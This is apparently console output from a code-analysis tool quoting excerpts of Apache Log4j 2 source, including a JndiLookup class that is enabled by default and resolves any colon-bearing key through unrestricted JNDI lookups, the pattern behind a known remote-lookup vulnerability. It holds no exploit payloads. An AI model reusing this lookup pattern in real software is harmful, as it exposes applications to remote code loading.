[2;36m                    [0m         [1;36m99[0m[39m:            [0m[1;35mprops.put[0m[1;39m([0m[39mContext.INITIAL_CONTEXT_FACTORY, factoryName[0m[1;39m)[0m[39m;[0m             [2m                [0m
[2;36m                    [0m         [1;36m100[0m[39m:            if [0m[1;39m([0m[39mproviderURL != null[0m[1;39m)[0m[39m [0m[1;39m{[0m                                          [2m                [0m
[2;36m                    [0m         [1;36m101[0m[39m:                [0m[1;35mprops.put[0m[1;39m([0m[39mContext.PROVIDER_URL, providerURL[0m[1;39m)[0m[39m;[0m                   [2m                [0m
[2;36m                    [0m         [1;36m102[0m[39m:            [0m[1;39m}[0m[39m else [0m[1;39m{[0m                                                            [2m                [0m
[2;36m                    [0m         [1;36m103[0m[39m:                [0m[1;35mLOGGER.warn[0m[1;39m([0m[32m"The InitialContext factory name has been provided [0m [2m                [0m
[2;36m                    [0m         [32mwithout a ProviderURL. "[0m[39m +[0m                                                          [2m                [0m
[2;36m                    [0m         [1;36m104[0m[39m:                    [0m[32m"This is likely to cause problems"[0m[1;39m)[0m[39m;[0m                        [2m                [0m
[2;36m                    [0m         [1;36m105[0m[39m:            [0m[1;39m}[0m                                                                   [2m                [0m
[2;36m                    [0m         [1;36m106[0m[39m:            if [0m[1;39m([0m[39murlPkgPrefixes != null[0m[1;39m)[0m[39m [0m[1;39m{[0m                                       [2m                [0m
[2;36m                    [0m         [1;36m107[0m[39m:                [0m[1;35mprops.put[0m[1;39m([0m[39mContext.URL_PKG_PREFIXES, urlPkgPrefixes[0m[1;39m)[0m[39m;[0m            [2m                [0m
[2;36m                    [0m         [1;36m108[0m[39m:            [0m[1;39m}[0m                                                                   [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/config/BaseConfiguration.jav[0m[1;92ma:80[0m[39m-[0m[1;36m1[0m [2m                [0m
[2;36m                    [0m         [1;36m10[0m                                                                                  [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m80[0m[39m:     * The ConfigurationMonitor that checks for configuration changes.[0m           [2m                [0m
[2;36m                    [0m         [1;36m81[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m82[0m[39m:    protected ConfigurationMonitor monitor = new [0m[1;35mDefaultConfigurationMonitor[0m[1;39m([0m[1;39m)[0m[39m;[0m  [2m                [0m
[2;36m                    [0m         [1;36m83[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m84[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m85[0m[39m:     * The Advertiser which exposes appender configurations to external systems.[0m [2m                [0m
[2;36m                    [0m         [1;36m86[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m87[0m[39m:    protected Advertiser advertiser = new [0m[1;35mDefaultAdvertiser[0m[1;39m([0m[1;39m)[0m[39m;[0m                   [2m                [0m
[2;36m                    [0m         [1;36m88[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m89[0m[39m:    private String name;[0m                                                         [2m                [0m
[2;36m                    [0m         [1;36m90[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m91[0m[39m:    private ConcurrentMap<String, Appender<?>> appenders = new [0m                  [2m                [0m
[2;36m                    [0m         [39mConcurrentHashMap<String, Appender<?>>[0m[1;39m([0m[1;39m)[0m[39m;[0m                                           [2m                [0m
[2;36m                    [0m         [1;36m92[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m93[0m[39m:    private ConcurrentMap<String, LoggerConfig> loggers = new [0m                   [2m                [0m
[2;36m                    [0m         [39mConcurrentHashMap<String, LoggerConfig>[0m[1;39m([0m[1;39m)[0m[39m;[0m                                          [2m                [0m
[2;36m                    [0m         [1;36m94[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m95[0m[39m:    private final StrLookup tempLookup = new [0m[1;35mInterpolator[0m[1;39m([0m[1;39m)[0m[39m;[0m                     [2m                [0m
[2;36m                    [0m         [1;36m96[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m97[0m[39m:    private final StrSubstitutor subst = new [0m[1;35mStrSubstitutor[0m[1;39m([0m[39mtempLookup[0m[1;39m)[0m[39m;[0m         [2m                [0m
[2;36m                    [0m         [1;36m98[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m99[0m[39m:    private LoggerConfig root = new [0m[1;35mLoggerConfig[0m[1;39m([0m[1;39m)[0m[39m;[0m                              [2m                [0m
[2;36m                    [0m         [1;36m100[0m[39m:[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m101[0m[39m:    private final boolean started = false;[0m                                      [2m                [0m
[2;36m                    [0m         [1;36m102[0m[39m:[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m103[0m[39m:    private final ConcurrentMap<String, Object> componentMap = new [0m             [2m                [0m
[2;36m                    [0m         [39mConcurrentHashMap<String, Object>[0m[1;39m([0m[1;39m)[0m[39m;[0m                                                [2m                [0m
[2;36m                    [0m         [1;36m104[0m[39m:[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m105[0m[39m:    [0m[35m/[0m[39m**[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m106[0m[39m:     * Constructor.[0m                                                             [2m                [0m
[2;36m                    [0m         [1;36m107[0m[39m:     *[0m[35m/[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m108[0m[39m:    protected [0m[1;35mBaseConfiguration[0m[1;39m([0m[1;39m)[0m[39m [0m[1;39m{[0m                                             [2m                [0m
[2;36m                    [0m         [1;36m109[0m[39m:        rootNode = new [0m[1;35mNode[0m[1;39m([0m[1;39m)[0m[39m;[0m                                                  [2m                [0m
[2;36m                    [0m         [1;36m110[0m[39m:    [0m[1;39m}[0m                                                                           [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/lookup/JndiLookup.jav[0m[1;92ma:1[0m[39m-[0m[1;36m88[0m        [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m1[0m[39m:[0m[35m/[0m[39m*[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m2[0m[39m: * Licensed to the Apache Software Foundation [0m[1;39m([0m[39mASF[0m[1;39m)[0m[39m under one or more[0m             [2m                [0m
[2;36m                    [0m         [1;36m3[0m[39m: * contributor license agreements. See the NOTICE file distributed with[0m           [2m                [0m
[2;36m                    [0m         [1;36m4[0m[39m: * this work for additional information regarding copyright ownership.[0m            [2m                [0m
[2;36m                    [0m         [1;36m5[0m[39m: * The ASF licenses this file to You under the Apache license, Version [0m[1;36m2.0[0m        [2m                [0m
[2;36m                    [0m         [1;36m6[0m[39m: * [0m[1;39m([0m[39mthe [0m[32m"License"[0m[1;39m)[0m[39m; you may not use this file except in compliance with[0m           [2m                [0m
[2;36m                    [0m         [1;36m7[0m[39m: * the License. You may obtain a copy of the License at[0m                           [2m                [0m
[2;36m                    [0m         [1;36m8[0m[39m: *[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m9[0m[39m: *      [0m[4;94mhttp://www.apache.org/licenses/LICENSE-2.0[0m                                [2m                [0m
[2;36m                    [0m         [1;36m10[0m[39m: *[0m                                                                               [2m                [0m
[2;36m                    [0m         [1;36m11[0m[39m: * Unless required by applicable law or agreed to in writing, software[0m           [2m                [0m
[2;36m                    [0m         [1;36m12[0m[39m: * distributed under the License is distributed on an [0m[32m"AS IS"[0m[39m BASIS,[0m             [2m                [0m
[2;36m                    [0m         [1;36m13[0m[39m: * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.[0m      [2m                [0m
[2;36m                    [0m         [1;36m14[0m[39m: * See the license for the specific language governing permissions and[0m           [2m                [0m
[2;36m                    [0m         [1;36m15[0m[39m: * limitations under the license.[0m                                                [2m                [0m
[2;36m                    [0m         [1;36m16[0m[39m: *[0m[35m/[0m                                                                              [2m                [0m
[2;36m                    [0m         [1;36m17[0m[39m:package org.apache.logging.log4j.core.lookup;[0m                                    [2m                [0m
[2;36m                    [0m         [1;36m18[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m19[0m[39m:import javax.naming.InitialContext;[0m                                              [2m                [0m
[2;36m                    [0m         [1;36m20[0m[39m:import javax.naming.NamingException;[0m                                             [2m                [0m
[2;36m                    [0m         [1;36m21[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m22[0m[39m:import org.apache.logging.log4j.core.LogEvent;[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m23[0m[39m:import org.apache.logging.log4j.core.config.plugins.Plugin;[0m                      [2m                [0m
[2;36m                    [0m         [1;36m24[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m25[0m[39m:[0m[35m/[0m[39m**[0m                                                                              [2m                [0m
[2;36m                    [0m         [1;36m26[0m[39m: * Looks up keys from JNDI resources.[0m                                            [2m                [0m
[2;36m                    [0m         [1;36m27[0m[39m: *[0m[35m/[0m                                                                              [2m                [0m
[2;36m                    [0m         [1;36m28[0m[39m:@[0m[1;35mPlugin[0m[1;39m([0m[39mname = [0m[32m"jndi"[0m[39m, category = [0m[32m"Lookup"[0m[1;39m)[0m                                      [2m                [0m
[2;36m                    [0m         [1;36m29[0m[39m:public class JndiLookup implements StrLookup [0m[1;39m{[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m30[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m31[0m[39m:    private static boolean ENABLE_JNDI = true;[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m32[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m33[0m[39m:    [0m[35m/[0m[39m** JNDI resourcce path prefix used in a J2EE container *[0m[35m/[0m                   [2m                [0m
[2;36m                    [0m         [1;36m34[0m[39m:    static final String CONTAINER_JNDI_RESOURCE_PATH_PREFIX = [0m[32m"java:comp/env/"[0m[39m;[0m  [2m                [0m
[2;36m                    [0m         [1;36m35[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m36[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m37[0m[39m:     * Get the value of the JNDI resource.[0m                                       [2m                [0m
[2;36m                    [0m         [1;36m38[0m[39m:     * @param key  the JNDI resource name to be looked up, may be null[0m           [2m                [0m
[2;36m                    [0m         [1;36m39[0m[39m:     * @return The value of the JNDI resource.[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m40[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m41[0m[39m:    @Override[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m42[0m[39m:    public String [0m[1;35mlookup[0m[1;39m([0m[39mfinal String key[0m[1;39m)[0m[39m [0m[1;39m{[0m                                     [2m                [0m
[2;36m                    [0m         [1;36m43[0m[39m:        return [0m[1;35mlookup[0m[1;39m([0m[39mnull, key[0m[1;39m)[0m[39m;[0m                                                [2m                [0m
[2;36m                    [0m         [1;36m44[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m45[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m46[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m47[0m[39m:     * Get the value of the JNDI resource.[0m                                       [2m                [0m
[2;36m                    [0m         [1;36m48[0m[39m:     * @param event The current LogEvent [0m[1;39m([0m[39mis ignored by this StrLookup[0m[1;39m)[0m[39m.[0m         [2m                [0m
[2;36m                    [0m         [1;36m49[0m[39m:     * @param key  the JNDI resource name to be looked up, may be null[0m           [2m                [0m
[2;36m                    [0m         [1;36m50[0m[39m:     * @return The value of the JNDI resource.[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m51[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m52[0m[39m:    @Override[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m53[0m[39m:    public String [0m[1;35mlookup[0m[1;39m([0m[39mfinal LogEvent event, final String key[0m[1;39m)[0m[39m [0m[1;39m{[0m               [2m                [0m
[2;36m                    [0m         [1;36m54[0m[39m:        if [0m[1;39m([0m[39mkey == null || ! ENABLE_JNDI[0m[1;39m)[0m[39m [0m[1;39m{[0m                                      [2m                [0m
[2;36m                    [0m         [1;36m55[0m[39m:            return null;[0m                                                         [2m                [0m
[2;36m                    [0m         [1;36m56[0m[39m:        [0m[1;39m}[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m57[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m58[0m[39m:        try [0m[1;39m{[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m59[0m[39m:            InitialContext ctx = new [0m[1;35mInitialContext[0m[1;39m([0m[1;39m)[0m[39m;[0m                           [2m                [0m
[2;36m                    [0m         [1;36m60[0m[39m:            return [0m[1;39m([0m[39mString[0m[1;39m)[0m[39m [0m[1;35mctx.lookup[0m[1;39m([0m[1;35mconvertJndiName[0m[1;39m([0m[39mkey[0m[1;39m)[0m[1;39m)[0m[39m;[0m                    [2m                [0m
[2;36m                    [0m         [1;36m61[0m[39m:        [0m[1;39m}[0m[39m catch [0m[1;39m([0m[39mNamingException e[0m[1;39m)[0m[39m [0m[1;39m{[0m                                            [2m                [0m
[2;36m                    [0m         [1;36m62[0m[39m:            return null;[0m                                                         [2m                [0m
[2;36m                    [0m         [1;36m63[0m[39m:        [0m[1;39m}[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m64[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m65[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m66[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m67[0m[39m:     * Convert the given JNDI name to the actual JNDI name to use.[0m               [2m                [0m
[2;36m                    [0m         [1;36m68[0m[39m:     * Default implementation applies the [0m[32m"java:comp/env/"[0m[39m prefix[0m                [2m                [0m
[2;36m                    [0m         [1;36m69[0m[39m:     * unless other scheme like [0m[32m"java:"[0m[39m is given.[0m                                [2m                [0m
[2;36m                    [0m         [1;36m70[0m[39m:     * @param jndiName The name of the resource.[0m                                 [2m                [0m
[2;36m                    [0m         [1;36m71[0m[39m:     * @return The fully qualified name to look up.[0m                              [2m                [0m
[2;36m                    [0m         [1;36m72[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m73[0m[39m:    private String [0m[1;35mconvertJndiName[0m[1;39m([0m[39mString jndiName[0m[1;39m)[0m[39m [0m[1;39m{[0m                            [2m                [0m
[2;36m                    [0m         [1;36m74[0m[39m:        if [0m[1;39m([0m[39m![0m[1;35mjndiName.startsWith[0m[1;39m([0m[39mCONTAINER_JNDI_RESOURCE_PATH_PREFIX[0m[1;39m)[0m[39m && [0m        [2m                [0m
[2;36m                    [0m         [1;35mjndiName.indexOf[0m[1;39m([0m[32m':'[0m[1;39m)[0m[39m == [0m[1;36m-1[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                      [2m                [0m
[2;36m                    [0m         [1;36m75[0m[39m:            jndiName = CONTAINER_JNDI_RESOURCE_PATH_PREFIX + jndiName;[0m           [2m                [0m
[2;36m                    [0m         [1;36m76[0m[39m:        [0m[1;39m}[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m77[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m78[0m[39m:        return jndiName;[0m                                                         [2m                [0m
[2;36m                    [0m         [1;36m79[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m80[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m81[0m[39m:    public static void [0m[1;35msetEnableJndi[0m[1;39m([0m[39mboolean enableJndi[0m[1;39m)[0m[39m [0m[1;39m{[0m                       [2m                [0m
[2;36m                    [0m         [1;36m82[0m[39m:        ENABLE_JNDI = enableJndi;[0m                                                [2m                [0m
[2;36m                    [0m         [1;36m83[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m84[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m85[0m[39m:    public static boolean [0m[1;35misEnableJndi[0m[1;39m([0m[1;39m)[0m[39m [0m[1;39m{[0m                                       [2m                [0m
[2;36m                    [0m         [1;36m86[0m[39m:        return ENABLE_JNDI;[0m                                                      [2m                [0m
[2;36m                    [0m         [1;36m87[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m88[0m[39m:[0m[1;39m}[0m                                                                                [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/lookup/JndiLookup.jav[0m[1;92ma:73[0m[39m-[0m[1;36m79[0m       [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m73[0m[39m:    private String [0m[1;35mconvertJndiName[0m[1;39m([0m[39mString jndiName[0m[1;39m)[0m[39m [0m[1;39m{[0m                            [2m                [0m
[2;36m                    [0m         [1;36m74[0m[39m:        if [0m[1;39m([0m[39m![0m[1;35mjndiName.startsWith[0m[1;39m([0m[39mCONTAINER_JNDI_RESOURCE_PATH_PREFIX[0m[1;39m)[0m[39m && [0m        [2m                [0m
[2;36m                    [0m         [1;35mjndiName.indexOf[0m[1;39m([0m[32m':'[0m[1;39m)[0m[39m == [0m[1;36m-1[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                      [2m                [0m
[2;36m                    [0m         [1;36m75[0m[39m:            jndiName = CONTAINER_JNDI_RESOURCE_PATH_PREFIX + jndiName;[0m           [2m                [0m
[2;36m                    [0m         [1;36m76[0m[39m:        [0m[1;39m}[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m77[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m78[0m[39m:        return jndiName;[0m                                                         [2m                [0m
[2;36m                    [0m         [1;36m79[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mapi/src/main/java/org/apache/logging/log4j/util/PropertiesUtil.jav[0m[1;92ma:28[0m[39m-[0m[1;36m70[0m           [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m28[0m[39m:public class PropertiesUtil [0m[1;39m{[0m                                                    [2m                [0m
[2;36m                    [0m         [1;36m29[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m30[0m[39m:    private static final PropertiesUtil LOG4J_PROPERTIES = new [0m                  [2m                [0m
[2;36m                    [0m         [1;35mPropertiesUtil[0m[1;39m([0m[32m"log4j2.component.properties"[0m[1;39m)[0m[39m;[0m                                      [2m                [0m
[2;36m                    [0m         [1;36m31[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m32[0m[39m:    private final Properties props;[0m                                              [2m                [0m
[2;36m                    [0m         [1;36m33[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m34[0m[39m:    public [0m[1;35mPropertiesUtil[0m[1;39m([0m[39mfinal Properties props[0m[1;39m)[0m[39m [0m[1;39m{[0m                              [2m                [0m
[2;36m                    [0m         [1;36m35[0m[39m:        this.props = props;[0m                                                      [2m                [0m
[2;36m                    [0m         [1;36m36[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m37[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m38[0m[39m:    public [0m[1;35mPropertiesUtil[0m[1;39m([0m[39mfinal String propsLocn[0m[1;39m)[0m[39m [0m[1;39m{[0m                              [2m                [0m
[2;36m                    [0m         [1;36m39[0m[39m:        this.props = new [0m[1;35mProperties[0m[1;39m([0m[1;39m)[0m[39m;[0m                                           [2m                [0m
[2;36m                    [0m         [1;36m40[0m[39m:        final ClassLoader loader = [0m[1;35mProviderUtil.findClassLoader[0m[1;39m([0m[1;39m)[0m[39m;[0m               [2m                [0m
[2;36m                    [0m         [1;36m41[0m[39m:        final InputStream in = [0m[1;35mloader.getResourceAsStream[0m[1;39m([0m[39mpropsLocn[0m[1;39m)[0m[39m;[0m            [2m                [0m
[2;36m                    [0m         [1;36m42[0m[39m:        if [0m[1;39m([0m[39mnull != in[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                        [2m                [0m
[2;36m                    [0m         [1;36m43[0m[39m:            try [0m[1;39m{[0m                                                                [2m                [0m
[2;36m                    [0m         [1;36m44[0m[39m:                [0m[1;35mthis.props.load[0m[1;39m([0m[39min[0m[1;39m)[0m[39m;[0m                                             [2m                [0m
[2;36m                    [0m         [1;36m45[0m[39m:            [0m[1;39m}[0m[39m catch [0m[1;39m([0m[39mfinal IOException e[0m[1;39m)[0m[39m [0m[1;39m{[0m                                      [2m                [0m
[2;36m                    [0m         [1;36m46[0m[39m:                [0m[35m/[0m[35m/[0m[39m ignored[0m                                                       [2m                [0m
[2;36m                    [0m         [1;36m47[0m[39m:            [0m[1;39m}[0m[39m finally [0m[1;39m{[0m                                                          [2m                [0m
[2;36m                    [0m         [1;36m48[0m[39m:                try [0m[1;39m{[0m                                                            [2m                [0m
[2;36m                    [0m         [1;36m49[0m[39m:                    [0m[1;35min.close[0m[1;39m([0m[1;39m)[0m[39m;[0m                                                  [2m                [0m
[2;36m                    [0m         [1;36m50[0m[39m:                [0m[1;39m}[0m[39m catch [0m[1;39m([0m[39mfinal IOException e[0m[1;39m)[0m[39m [0m[1;39m{[0m                                  [2m                [0m
[2;36m                    [0m         [1;36m51[0m[39m:                    [0m[35m/[0m[35m/[0m[39m ignored[0m                                                   [2m                [0m
[2;36m                    [0m         [1;36m52[0m[39m:                [0m[1;39m}[0m                                                                [2m                [0m
[2;36m                    [0m         [1;36m53[0m[39m:            [0m[1;39m}[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m54[0m[39m:        [0m[1;39m}[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m55[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m56[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m57[0m[39m:    public static PropertiesUtil [0m[1;35mgetProperties[0m[1;39m([0m[1;39m)[0m[39m [0m[1;39m{[0m                               [2m                [0m
[2;36m                    [0m         [1;36m58[0m[39m:        return LOG4J_PROPERTIES;[0m                                                 [2m                [0m
[2;36m                    [0m         [1;36m59[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m60[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m61[0m[39m:    public String [0m[1;35mgetStringProperty[0m[1;39m([0m[39mfinal String name[0m[1;39m)[0m[39m [0m[1;39m{[0m                         [2m                [0m
[2;36m                    [0m         [1;36m62[0m[39m:        String prop = null;[0m                                                      [2m                [0m
[2;36m                    [0m         [1;36m63[0m[39m:        try [0m[1;39m{[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m64[0m[39m:            prop = [0m[1;35mSystem.getProperty[0m[1;39m([0m[39mname[0m[1;39m)[0m[39m;[0m                                     [2m                [0m
[2;36m                    [0m         [1;36m65[0m[39m:        [0m[1;39m}[0m[39m catch [0m[1;39m([0m[39mfinal SecurityException e[0m[1;39m)[0m[39m [0m[1;39m{[0m                                    [2m                [0m
[2;36m                    [0m         [1;36m66[0m[39m:            [0m[35m/[0m[35m/[0m[39m Ignore[0m                                                            [2m                [0m
[2;36m                    [0m         [1;36m67[0m[39m:        [0m[1;39m}[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m68[0m[39m:        return [0m[1;39m([0m[39mprop == null[0m[1;39m)[0m[39m ? [0m[1;35mprops.getProperty[0m[1;39m([0m[39mname[0m[1;39m)[0m[39m : prop;[0m                  [2m                [0m
[2;36m                    [0m         [1;36m69[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m70[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mapi/src/main/java/org/apache/logging/log4j/util/PropertiesUtil.jav[0m[1;92ma:118[0m[39m-[0m[1;36m125[0m         [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m118[0m[39m:    public boolean [0m[1;35mgetBooleanProperty[0m[1;39m([0m[39mfinal String name[0m[1;39m)[0m[39m [0m[1;39m{[0m                      [2m                [0m
[2;36m                    [0m         [1;36m119[0m[39m:        return [0m[1;35mgetBooleanProperty[0m[1;39m([0m[39mname, false[0m[1;39m)[0m[39m;[0m                                 [2m                [0m
[2;36m                    [0m         [1;36m120[0m[39m:    [0m[1;39m}[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m121[0m[39m:[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m122[0m[39m:    public boolean [0m[1;35mgetBooleanProperty[0m[1;39m([0m[39mfinal String name, final boolean [0m         [2m                [0m
[2;36m                    [0m         [39mdefaultValue[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                                     [2m                [0m
[2;36m                    [0m         [1;36m123[0m[39m:        final String prop = [0m[1;35mgetStringProperty[0m[1;39m([0m[39mname[0m[1;39m)[0m[39m;[0m                            [2m                [0m
[2;36m                    [0m         [1;36m124[0m[39m:        return [0m[1;39m([0m[39mprop == null[0m[1;39m)[0m[39m ? defaultValue : [0m[32m"true"[0m[1;35m.equalsIgnoreCase[0m[1;39m([0m[39mprop[0m[1;39m)[0m[39m;[0m   [2m                [0m
[2;36m                    [0m         [1;36m125[0m[39m:    [0m[1;39m}[0m                                                                           [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/pattern/MessagePatternConverter.ja[0m [2m                [0m
[2;36m                    [0m         [39mv[0m[1;92ma:1[0m[39m-[0m[1;36m78[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m1[0m[39m:[0m[35m/[0m[39m*[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m2[0m[39m: * Licensed to the Apache Software Foundation [0m[1;39m([0m[39mASF[0m[1;39m)[0m[39m under one or more[0m             [2m                [0m
[2;36m                    [0m         [1;36m3[0m[39m: * contributor license agreements. See the NOTICE file distributed with[0m           [2m                [0m
[2;36m                    [0m         [1;36m4[0m[39m: * this work for additional information regarding copyright ownership.[0m            [2m                [0m
[2;36m                    [0m         [1;36m5[0m[39m: * The ASF licenses this file to You under the Apache license, Version [0m[1;36m2.0[0m        [2m                [0m
[2;36m                    [0m         [1;36m6[0m[39m: * [0m[1;39m([0m[39mthe [0m[32m"License"[0m[1;39m)[0m[39m; you may not use this file except in compliance with[0m           [2m                [0m
[2;36m                    [0m         [1;36m7[0m[39m: * the License. You may obtain a copy of the License at[0m                           [2m                [0m
[2;36m                    [0m         [1;36m8[0m[39m: *[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m9[0m[39m: *      [0m[4;94mhttp://www.apache.org/licenses/LICENSE-2.0[0m                                [2m                [0m
[2;36m                    [0m         [1;36m10[0m[39m: *[0m                                                                               [2m                [0m
[2;36m                    [0m         [1;36m11[0m[39m: * Unless required by applicable law or agreed to in writing, software[0m           [2m                [0m
[2;36m                    [0m         [1;36m12[0m[39m: * distributed under the License is distributed on an [0m[32m"AS IS"[0m[39m BASIS,[0m             [2m                [0m
[2;36m                    [0m         [1;36m13[0m[39m: * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.[0m      [2m                [0m
[2;36m                    [0m         [1;36m14[0m[39m: * See the license for the specific language governing permissions and[0m           [2m                [0m
[2;36m                    [0m         [1;36m15[0m[39m: * limitations under the license.[0m                                                [2m                [0m
[2;36m                    [0m         [1;36m16[0m[39m: *[0m[35m/[0m                                                                              [2m                [0m
